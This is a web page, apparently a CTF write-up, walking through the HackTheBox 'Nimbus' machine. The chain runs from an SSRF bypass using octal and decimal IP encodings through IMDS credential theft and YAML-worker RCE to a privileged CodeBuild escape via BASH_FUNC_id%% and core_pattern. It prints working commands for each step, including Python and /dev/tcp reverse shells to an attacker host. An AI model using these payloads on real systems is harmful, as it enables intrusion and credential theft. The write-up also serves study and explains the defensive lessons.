@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Case File — Nimbus</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Special+Elite&family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="case-file.css">
+<style>
+  .flag-redacted{
+    display:inline-block; vertical-align:middle;
+    height:15px; width:230px; max-width:60vw;
+    background: repeating-linear-gradient(90deg, var(--ink) 0 60%, transparent 0 100%);
+    background-color: var(--paper); background-size:14px 100%;
+    border-radius:2px; opacity:0.92;
+  }
+  .flag-row{display:flex;align-items:center;gap:10px;margin:10px 0;font-family:'IBM Plex Mono',monospace;font-size:0.85rem;}
+  .flag-label{color:var(--brass);text-transform:uppercase;letter-spacing:0.05em;font-size:0.72rem;min-width:64px;}
+  .stage table{width:100%;border-collapse:collapse;margin:14px 0;font-size:0.85rem;}
+  .stage table th,.stage table td{border:1px solid var(--panel-line);padding:8px 10px;text-align:left;color:var(--text);}
+  .stage table th{color:var(--brass);font-family:'IBM Plex Mono',monospace;font-size:0.72rem;text-transform:uppercase;}
+</style>
+</head>
+<body>
+
+<nav>
+  <a href="../index.html" class="active">Dossier</a>
+  <a href="../case-files.html">Case Files</a>
+  <a href="../projects.html">Projects</a>
+  <a href="../blog.html">Blog</a>
+  <a href="../team.html">Team</a>
+  <a href="../contact.html">Contact</a>
+</nav> 
+
+<div class="topbar">
+  <a class="back" href="../case-files.html">&larr; Back to Case Files</a>
+  <span class="case-no">FILE NO. 2019-014</span>
+</div>
+
+<main>
+  <span class="file-tab">Hard · Linux / Cloud</span>
+  <h1>Nimbus</h1>
+  <div class="subtitle">HackTheBox — Season 11</div>
+  <div class="tags">
+    <span class="tag">SSRF Bypass</span>
+    <span class="tag">IMDS Credential Theft</span>
+    <span class="tag">Container Escape</span>
+  </div>
+
+  <div class="chain">
+    <span class="node">SSRF Blocklist Bypass</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">IMDS Credential Theft</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">SQS/YAML RCE</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">Container Escape</span>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">00</span><h2>Attack Chain Summary</h2></div>
+    <pre><code>SSRF (octal/decimal IP bypass)
+    ↓
+IMDS Credential Theft (nimbus-web-role)
+    ↓
+SQS → Worker RCE (Unsafe YAML Deserialization)
+    ↓
+User Flag Captured
+    ↓
+LocalStack CodeBuild (privilegedMode=true)
+    ↓
+BASH_FUNC_id%% Entrypoint Bypass
+    ↓
+core_pattern Host Kernel Escape
+    ↓
+Root Flag Captured</code></pre>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">01</span><h2>Phase 1: Reconnaissance</h2></div>
+    <p><strong>Port Scanning</strong></p>
+    <pre><code>nmap -sC -sV -p- --min-rate 5000 &lt;TARGET_IP&gt;</code></pre>
+    <pre><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
+80/tcp open  http    nginx 1.24.0 (Ubuntu)</code></pre>
+    <p>Only two ports open. <code>/</code> redirects to a vhost.</p>
+
+    <p><strong>Hostname Discovery</strong></p>
+    <pre><code>echo "&lt;TARGET_IP&gt; nimbus.htb" | sudo tee -a /etc/hosts
+echo "&lt;TARGET_IP&gt; aws.nimbus.htb" | sudo tee -a /etc/hosts</code></pre>
+
+    <p><strong>Web Enumeration</strong></p>
+    <pre><code>gobuster dir -u http://nimbus.htb/ -w /usr/share/wordlists/dirb/common.txt -t 50</code></pre>
+    <pre><code>/jobs                 (Status: 200)
+/login                (Status: 200)</code></pre>
+    <p>The site is <strong>"Nimbus — Internal Job Scheduler"</strong>.</p>
+    <ul style="color:var(--text);font-size:0.95rem;">
+      <li><code>/login</code> is disabled ("SSO migrating to Okta — ETA end of sprint"). The page itself states the job submitter is <strong>unauthenticated during the migration window</strong>.</li>
+      <li><code>/jobs</code> submits a job either by raw Git URL or by pasting YAML directly, both via <code>POST /jobs/preview</code>. The form explicitly warns: <em>"URL must point to a .yaml file. Internal addresses and metadata endpoints are blocked."</em></li>
+    </ul>
+
+    <p><strong>Health Check Endpoint</strong></p>
+    <pre><code>curl -s http://nimbus.htb/api/v1/health</code></pre>
+    <pre><code>{
+  "services": {
+    "queue":     {"endpoint": "http://aws.nimbus.htb", "status": "ok"},
+    "scheduler": {"endpoint": "http://aws.nimbus.htb", "status": "ok"},
+    "storage":   {"endpoint": "http://aws.nimbus.htb", "status": "ok"}
+  },
+  "status": "healthy",
+  "version": "1.4.2"
+}</code></pre>
+    <p>This reveals an internal AWS-style backend referenced as <code>aws.nimbus.htb</code> — later confirmed to be <strong>LocalStack</strong>.</p>
+    <div class="why"><strong>Why this mattered</strong>A "temporarily disabled auth" banner is a strong signal the underlying functionality still works and is worth testing directly.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">02</span><h2>Phase 2: SSRF &amp; IMDS Credential Theft</h2></div>
+    <p><strong>Probing the Blocklist</strong></p>
+    <pre><code>curl -s -X POST http://nimbus.htb/jobs/preview --data-urlencode "url=http://127.0.0.1/test.yaml"
+curl -s -X POST http://nimbus.htb/jobs/preview --data-urlencode "url=http://169.254.169.254/test.yaml"
+curl -s -X POST http://nimbus.htb/jobs/preview --data-urlencode "url=http://aws.nimbus.htb/test.yaml"</code></pre>
+    <p>All three returned: <em>"Security policy: this URL targets an internal resource and has been blocked."</em></p>
+    <p>This is a <mark class="rust"><strong>string-match</strong></mark> blocklist, not an IP-resolution check — confirmed by testing alternate numeric encodings of the same loopback address:</p>
+    <pre><code>curl -s -X POST http://nimbus.htb/jobs/preview --data-urlencode "url=http://0177.0.0.1/test.yaml"</code></pre>
+    <p>Fetched successfully (real nginx 301 returned) — <code>0177.0.0.1</code> is octal for <code>127.0.0.1</code>, resolves identically at the socket layer, but doesn't match the blocked string.</p>
+
+    <p><strong>Reaching IMDS</strong></p>
+    <p><code>169.254.169.254</code> in decimal is <code>2852039166</code>:</p>
+    <pre><code>curl -s -X POST http://nimbus.htb/jobs/preview \
+  --data-urlencode "url=http://2852039166/latest/meta-data/.yaml"</code></pre>
+    <p>Returned the literal text <code>Not Found</code> — the exact response style of real AWS IMDS for an invalid path, confirming we're through.</p>
+    <p>A second, separate filter requires the URL string to <strong>end in .yaml/.yml</strong>. Real IMDS paths don't naturally end that way, so a query-string trick was used to satisfy the extension check without breaking the path:</p>
+    <pre><code>curl -s -X POST http://nimbus.htb/jobs/preview \
+  --data-urlencode "url=http://2852039166/latest/meta-data/iam/security-credentials/?x=.yaml"</code></pre>
+    <pre><code>nimbus-web-role</code></pre>
+    <pre><code>curl -s -X POST http://nimbus.htb/jobs/preview \
+  --data-urlencode "url=http://2852039166/latest/meta-data/iam/security-credentials/nimbus-web-role?x=.yaml"</code></pre>
+    <pre><code>{
+  "Code": "Success",
+  "Type": "AWS-HMAC",
+  "AccessKeyId": "&lt;redacted&gt;",
+  "SecretAccessKey": "&lt;redacted&gt;",
+  "Token": "&lt;redacted session token&gt;",
+  "Expiration": "2026-06-21T01:19:14Z"
+}</code></pre>
+    <blockquote style="border-left:2px solid var(--brass);padding-left:12px;color:var(--muted);font-size:0.85rem;">
+      <strong>Note on timing:</strong> these are temporary session credentials with a short lifetime (~10 minutes observed). The attacking box's clock should be roughly synced to the target's. <code>ntpdate</code> over UDP/123 won't work (no NTP service exposed) — instead, grab the target's time from its own HTTP <code>Date:</code> header and set it manually:
+    </blockquote>
+    <pre><code>curl -sI http://nimbus.htb/ | grep -i ^date
+sudo date -u -s "&lt;value from above&gt;"</code></pre>
+    <div class="why"><strong>Why this mattered</strong>String-based SSRF blocklists are close to unenforceable — there are too many equivalent ways to write the same address. Only a validated, resolved-IP allowlist actually closes this class of bug.</div>
+
+    <p><strong>A Dead End Worth Documenting: Port 9090</strong></p>
+    <p>The health check pointed at <code>aws.nimbus.htb</code>. The hostname itself is blocked (case-insensitively, trailing-dot too). Probing loopback ports behind the IP encoding bypass turned up port <strong>9090</strong> returning what looked like a real AWS/LocalStack STS error:</p>
+    <pre><code>curl -s -X POST http://nimbus.htb/jobs/preview \
+  --data-urlencode "url=http://0177.0.0.1:9090/test.yaml"</code></pre>
+    <pre><code>&lt;ErrorResponse xmlns="https://sts.amazonaws.com/doc/2011-06-15/"&gt;
+  &lt;Error&gt;
+    &lt;Type&gt;Sender&lt;/Type&gt;
+    &lt;Code&gt;InvalidClientTokenId&lt;/Code&gt;
+    &lt;Message&gt;The security token included in the request is invalid.&lt;/Message&gt;
+  &lt;/Error&gt;
+  &lt;RequestId&gt;p7518495-adc4-1191-49n2-4m70d8sdf922&lt;/RequestId&gt;
+&lt;/ErrorResponse&gt;</code></pre>
+    <p>A significant amount of time was spent here trying to fix AWS SigV2/SigV4 signing against this endpoint (clock skew, percent-encoding stripped by the SSRF filter, host-header mismatches). <strong>None of it mattered</strong> — every single request to port 9090, regardless of payload, auth, or signature, returned this exact static response with the <mark class="rust"><strong>same RequestId every time</strong></mark>. This port is a deliberate decoy, not a real service. The actual LocalStack instance lives elsewhere, reachable only from inside the worker container's own network namespace (see Phase 4).</p>
+    <p><strong>Lesson:</strong> if a "service" returns byte-identical output (including request IDs that should be unique) regardless of input, stop debugging your payload — debug whether the service is real first.</p>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">03</span><h2>Phase 3: Worker RCE &amp; User Flag</h2></div>
+    <p><strong>The Vulnerable Sink</strong></p>
+    <p>Eventually, source for the job worker (<code>worker.py</code>) was recovered, revealing:</p>
+    <pre><code>job = yaml.load(body, Loader=yaml.Loader)   # UNSAFE — full loader
+subprocess.run(["python3", "-c", job["script"]], ...)</code></pre>
+    <p>The worker polls an SQS queue (<code>nimbus-jobs</code>) and blindly executes whatever string is in the <code>script</code> field via <code>python3 -c</code>. <mark>No deserialization gadget is even required</mark> — a plain string is enough.</p>
+
+    <p><strong>Reaching the Queue</strong></p>
+    <p>The <code>nimbus-web-role</code> credentials grant <code>sqs:SendMessage</code> on the queue. The real LocalStack/SQS endpoint, internally resolvable as <code>floci:4566</code>, is what actually processes these — not the port-9090 decoy.</p>
+    <pre><code>nc -lvnp 4444</code></pre>
+    <pre><code>aws --endpoint-url http://floci:4566 sqs send-message \
+  --queue-url http://floci:4566/847219365028/nimbus-jobs \
+  --message-body 'name: pwn
+script: |
+  import socket,subprocess,os
+  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+  s.connect(("&lt;kali vpn&gt;",4444))
+  os.dup2(s.fileno(),0)
+  os.dup2(s.fileno(),1)
+  os.dup2(s.fileno(),2)
+  subprocess.call(["/bin/sh","-i"])'</code></pre>
+    <pre><code>connect to [&lt;kali vpn&gt;] from (UNKNOWN) [&lt;TARGET_IP&gt;] 58166
+worker@4af9e57afb84:/app$</code></pre>
+
+    <p><strong>User Flag</strong></p>
+    <pre><code>worker@4af9e57afb84:/app$ cat /home/*/user.txt</code></pre>
+    <div class="flag-row"><span class="flag-label">User Flag</span><span class="flag-redacted"></span></div>
+    <div class="why"><strong>Why this mattered</strong>An unrestricted YAML loader paired with "then execute a field from it" is one of the most direct RCE primitives possible — worth flagging on sight in any code review.</div>
+
+    <p><strong>IAM Permission Probing</strong></p>
+    <p>From this foothold, the role's permissions were enumerated by trial and error. Denied:</p>
+    <pre><code>iam:ListAttachedRolePolicies
+ec2:DescribeInstances
+ssm:SendCommand
+ssm:DescribeInstanceInformation
+s3:ListBucket (on nimbus-dev-artifacts)</code></pre>
+    <p>Allowed (and load-bearing for the rest of the chain):</p>
+    <pre><code>sqs:SendMessage
+codebuild:* (CreateProject, StartBuild, BatchGetBuilds, etc.)</code></pre>
+    <p>This narrowed the privesc path decisively toward <strong>CodeBuild</strong> once direct filesystem/SSM/EC2 routes were ruled out.</p>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">04</span><h2>Phase 4: Privilege Escalation to Root</h2></div>
+    <p><strong>Identify the Real LocalStack Endpoint</strong></p>
+    <p>Inside the worker container, <code>/etc/hosts</code> showed:</p>
+    <pre><code>172.18.0.1      nimbus.htb
+172.18.0.1      aws.nimbus.htb
+172.18.0.3      4af9e57afb84</code></pre>
+    <p><code>aws.nimbus.htb</code> resolves internally to the Docker bridge gateway — not the real backend. The actual LocalStack service is reachable as <code>floci:4566</code> on the worker's own network, confirmed via:</p>
+    <pre><code>curl -s http://floci:4566/_localstack/health</code></pre>
+    <pre><code>{"edition":"community","services":{"sqs":"running","s3":"running","codebuild":"running", ...},"version":"1.5.17"}</code></pre>
+
+    <p><strong>Create a Privileged CodeBuild Project</strong></p>
+    <pre><code>import boto3
+client = boto3.client("codebuild", endpoint_url="http://floci:4566", region_name="us-east-1")
+
+response = client.create_project(
+    name="exploit-1782000474",
+    source={"type": "NO_SOURCE"},
+    artifacts={"type": "NO_ARTIFACTS"},
+    environment={
+        "type": "LINUX_CONTAINER",
+        "image": "floci/floci:latest",
+        "computeType": "BUILD_GENERAL1_SMALL",
+        "privilegedMode": True
+    },
+    serviceRole="arn:aws:iam::847219365028:role/nimbus-web-role"
+)</code></pre>
+    <p>Builds were then triggered remotely by writing a small Python payload to disk and dropping a queue message that <code>exec()</code>s it (kept code out of the SQS message body to avoid quoting/escaping issues):</p>
+    <pre><code>aws --endpoint-url http://floci:4566 sqs send-message \
+  --queue-url http://floci:4566/847219365028/nimbus-jobs \
+  --message-body '{"name": "build", "script": "exec(open(\"/tmp/priv_shell.py\").read())"}'</code></pre>
+
+    <p><strong>Buildspec Debugging — Real Pitfalls Hit</strong></p>
+    <p><strong>Attempt 1 — <mark class="rust">instant fake "SUCCEEDED" with empty logs</mark>.</strong> Build completed in under a second with <code>NO_SOURCE</code> and zero log events. Root cause: the buildspec YAML had lost its indentation through a heredoc paste (<code>phases:</code>, <code>build:</code>, <code>commands:</code> all flush-left) — invalid nesting was silently treated as a no-op rather than erroring.</p>
+    <p><strong>Fix</strong> — never trust heredocs for multi-line YAML in a copy-paste-heavy session; build it with <code>printf</code> and explicit <code>\n</code>, then verify with <code>cat -A</code>:</p>
+    <pre><code>printf 'version: 0.2\nphases:\n  build:\n    commands:\n      - "exec 3&lt;&gt;/dev/tcp/&lt;kali vpn&gt;/4446"\n      - "echo PROOF: $(id) &gt;&amp;3"\n' &gt; /tmp/build.yml
+cat -A /tmp/build.yml</code></pre>
+    <p><strong>Attempt 2 — real parse error.</strong></p>
+    <pre><code>COMMAND_EXECUTION_ERROR: Failed to parse buildspec: while scanning for the
+next token found character '%' that cannot start any token. (Do not use %
+for indentation)</code></pre>
+    <p>SnakeYAML treats an unescaped <code>%</code> in a plain scalar as a directive marker. The command <code>printf "PROOF: %s\n" "$(id)"</code> triggered this. <strong>Fix</strong> — quote the command string and avoid <code>%</code>-style printf entirely:</p>
+    <pre><code>printf 'version: 0.2\nphases:\n  build:\n    commands:\n      - "exec 3&lt;&gt;/dev/tcp/&lt;kali vpn&gt;/4446"\n      - "echo PROOF: $(id) &gt;&amp;3"\n' &gt; /tmp/build.yml</code></pre>
+    <p><strong>Attempt 3 — transient runtime error.</strong></p>
+    <pre><code>Exit code 128: OCI runtime exec failed: ... error executing setns process: exit status 1</code></pre>
+    <p>Resolved itself on retry (container runtime contention from rapid repeated <code>start_build</code> calls).</p>
+
+    <p><strong>BASH_FUNC_id%% — Defeating the Entrypoint's Privilege Drop</strong></p>
+    <p>The <code>floci/floci:latest</code> image's entrypoint drops root before running build commands:</p>
+    <pre><code>if [ "$(id -u)" = "0" ]; then
+    exec gosu worker "$@"
+fi</code></pre>
+    <p>Bash supports importing <strong>function definitions</strong> through environment variables named <code>BASH_FUNC_&lt;name&gt;%%</code>. A function shadows any external binary of the same name in unqualified lookups — including inside the entrypoint script.</p>
+    <p><strong>First attempt (wrong):</strong></p>
+    <pre><code>{"name": "BASH_FUNC_id%%", "value": "() { echo 0; }", "type": "PLAINTEXT"}</code></pre>
+    <p>This still returns <code>"0"</code> from <code>id -u</code>, so the check <strong>passes</strong> and <code>gosu</code> still runs. Confirmed by the resulting log:</p>
+    <pre><code>error: failed switching to "floci": operation not permitted</code></pre>
+    <p>— <code>gosu</code> <em>did</em> attempt to run (and failed for an unrelated reason), proving the bypass logic itself was backwards.</p>
+    <p><strong>Correct value</strong> — the function must return anything other than exactly <code>"0"</code>:</p>
+    <pre><code>{"name": "BASH_FUNC_id%%", "value": "() { echo uid=1000; }", "type": "PLAINTEXT"}</code></pre>
+    <p>Now <code>$(id -u)</code> returns <code>uid=1000</code>, which doesn't equal <code>"0"</code>, the check fails, and <code>gosu</code> is <mark class="rust"><strong>skipped entirely</strong></mark> — the build commands run as the container's real root.</p>
+    <div class="why"><strong>Why this mattered</strong>A security check implemented by shelling out to and parsing another command's output (here, <code>id -u</code>) can be hijacked by anything that controls the environment that command runs in — including function-shadowing tricks most reviewers wouldn't think to test.</div>
+
+    <p><strong>Getting and Verifying the Root Shell</strong></p>
+    <pre><code>nc -lvnp 4447</code></pre>
+    <pre><code>buildspec = "version: 0.2\nphases:\n  build:\n    commands:\n      - \"bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;kali vpn&gt;/4447 0&gt;&amp;1'\"\n"
+response = client.start_build(
+    projectName="exploit-1782000474",
+    buildspecOverride=buildspec,
+    environmentVariablesOverride=[
+        {"name": "BASH_FUNC_id%%", "value": "() { echo uid=1000; }", "type": "PLAINTEXT"}
+    ]
+)</code></pre>
+    <pre><code>connect to [&lt;kali vpn&gt;] from (UNKNOWN) [&lt;TARGET_IP&gt;] 46148
+[root@6d85ed3d5155 src]#</code></pre>
+    <p>Because <code>id</code> itself is shadowed inside this shell, real UID has to be checked a different way:</p>
+    <pre><code>[root@6d85ed3d5155 src]# cat /proc/self/status | grep ^Uid
+Uid:    0       0       0       0
+[root@6d85ed3d5155 src]# cat /proc/self/status | grep ^Cap
+CapEff: 000001ffffffffff</code></pre>
+    <p><mark class="rust">Confirmed: full root, full capability set.</mark></p>
+
+    <p><strong>core_pattern Host Escape</strong></p>
+    <p>With <code>privilegedMode: true</code>, the container has effectively the entire Linux capability set. <code>/proc/sys/kernel/core_pattern</code> is a <mark class="rust"><strong>global, non-namespaced</strong></mark> kernel setting — writing to it from inside any sufficiently privileged container affects the <strong>host</strong> kernel's core-dump handling, not just the container's view of it.</p>
+    <p><strong>Step 1 — find the container's writable layer on the host filesystem:</strong></p>
+    <pre><code>UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
+echo "$UDIR"
+# /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/178/fs</code></pre>
+    <p><strong>Step 2 — write the exploit script.</strong> Anything written here, on the host, also appears at <code>/</code> inside this container (it's the overlay's upperdir):</p>
+    <pre><code>printf '#!/bin/sh\ncat /root/root.txt &gt; %s/rootflag.txt\n' "$UDIR" &gt; /exploit_root.sh
+chmod +x /exploit_root.sh
+cat /exploit_root.sh</code></pre>
+    <pre><code>#!/bin/sh
+cat /root/root.txt &gt; /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/178/fs/rootflag.txt</code></pre>
+    <p><strong>Step 3 — point the host kernel's core-dump handler at it:</strong></p>
+    <pre><code>echo "|${UDIR}/exploit_root.sh" &gt; /proc/sys/kernel/core_pattern
+cat /proc/sys/kernel/core_pattern</code></pre>
+    <pre><code>|/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/178/fs/exploit_root.sh</code></pre>
+    <p><strong>Step 4 — trigger a crash.</strong> Any SIGSEGV anywhere now causes the kernel to run our script, as real host root, outside every container namespace:</p>
+    <pre><code>bash -c 'kill -11 $$'
+sleep 2
+cat /rootflag.txt</code></pre>
+    <div class="flag-row"><span class="flag-label">Root Flag</span><span class="flag-redacted"></span></div>
+    <div class="why"><strong>Why this mattered</strong>Privileged containers effectively hand out host-adjacent root the moment an attacker can also write to non-namespaced kernel interfaces like the core-dump handler — a well-known but still very effective escape route.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">05</span><h2>Complete Attack Chain Summary</h2></div>
+    <table>
+      <tr><th>Step</th><th>Action</th></tr>
+      <tr><td>1</td><td>SSRF blocklist bypassed via octal/decimal IP encoding (0177.0.0.1, 2852039166)</td></tr>
+      <tr><td>2</td><td>IMDS reached through SSRF → nimbus-web-role temporary AWS credentials</td></tr>
+      <tr><td>3</td><td>sqs:SendMessage used to push a malicious job; worker's yaml.load() + subprocess.run(["python3","-c", job["script"]]) → RCE as worker</td></tr>
+      <tr><td>4</td><td>User flag retrieved from /home/*/user.txt</td></tr>
+      <tr><td>5</td><td>codebuild:* used to create a privilegedMode=true CodeBuild project against the real LocalStack instance (floci:4566), reachable only from inside the worker's network</td></tr>
+      <tr><td>6</td><td>BASH_FUNC_id%% env var hijacks the entrypoint's id -u check, skipping its gosu privilege drop</td></tr>
+      <tr><td>7</td><td>Real root, full capabilities, inside the privileged build container</td></tr>
+      <tr><td>8</td><td>/proc/sys/kernel/core_pattern written from inside the container — global, non-namespaced, affects the host kernel</td></tr>
+      <tr><td>9</td><td>kill -11 triggers the host kernel to execute our script as host root</td></tr>
+      <tr><td>10</td><td>Root flag read from /root/root.txt via the container's own overlay upperdir</td></tr>
+    </table>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">06</span><h2>Tools Used</h2></div>
+    <ul style="color:var(--text);font-size:0.95rem;">
+      <li><code>nmap</code> — port scanning</li>
+      <li><code>gobuster</code> — directory/vhost enumeration</li>
+      <li><code>curl</code> — SSRF exploitation and IMDS extraction</li>
+      <li><code>aws</code> CLI / <code>boto3</code> — SQS messaging, CodeBuild project/build management</li>
+      <li><code>nc</code> — reverse shell listeners</li>
+      <li><code>python3</code> — RCE payloads, automation glue</li>
+    </ul>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">07</span><h2>Key Vulnerabilities</h2></div>
+    <ol style="color:var(--text);font-size:0.95rem;">
+      <li><strong>SSRF blocklist using string matching instead of resolved-IP checks</strong> — trivially bypassed with octal/decimal IP notation.</li>
+      <li><strong>IMDS exposed with no SSRF defense-in-depth</strong> (no IMDSv2 token requirement / hop-limit) — single SSRF anywhere is a direct credential leak.</li>
+      <li><strong>Unsafe YAML deserialization combined with unsanitized subprocess.run</strong> — job["script"] from an untrusted queue message goes straight to python3 -c.</li>
+      <li><strong>Overly broad IAM policy</strong> — codebuild:* on a role that only needed queue access enabled the entire privesc path.</li>
+      <li><strong>privilegedMode: true on a CI/build backend</strong> — equivalent to handing out host-adjacent root the moment an attacker can also influence the entrypoint's privilege-drop logic.</li>
+      <li><strong>Privilege-drop logic that shells out to id</strong> — defeated by BASH_FUNC_id%%, a classic but still-effective environment-variable function-injection trick against any security check that depends on the output of an external command rather than a kernel-enforced primitive.</li>
+      <li><strong>No restriction on writing to /proc/sys/kernel/core_pattern from a privileged container</strong> — a well-known but still devastating container-to-host escape, since the kernel's core-dump handler runs completely outside container namespaces.</li>
+    </ol>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">08</span><h2>Lessons for Future CTFs</h2></div>
+    <ul style="color:var(--text);font-size:0.95rem;">
+      <li>When an internal "service" returns identical output (including supposedly unique fields like request IDs) regardless of input, stop debugging your request and start questioning whether the service is even real.</li>
+      <li>Heredocs are unreliable for multi-line YAML/config content when working through a relayed shell — printf with explicit \n, verified with cat -A, is far more reliable.</li>
+      <li>Always verify privilege-bypass logic produces output that actually fails the target's comparison (e.g. BASH_FUNC_id%% must NOT return "0") — don't assume a fake function alone is sufficient without checking exactly what string the check compares against.</li>
+      <li>IAM permission denials are useful reconnaissance — systematically probing what's denied narrows the privesc surface to what's actually allowed.</li>
+    </ul>
+  </div>
+</main>
+
+<footer>
+  <a href="mailto:burritosec51@gmail.com">burritosec51@gmail.com</a>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+  hljs.configure({ languages: ["bash","shell","powershell","python","json","yaml","sql","xml","ini","javascript","php"] });
+  document.querySelectorAll("pre code").forEach((block) => { hljs.highlightElement(block); });
+</script>
+</body>
+</html>
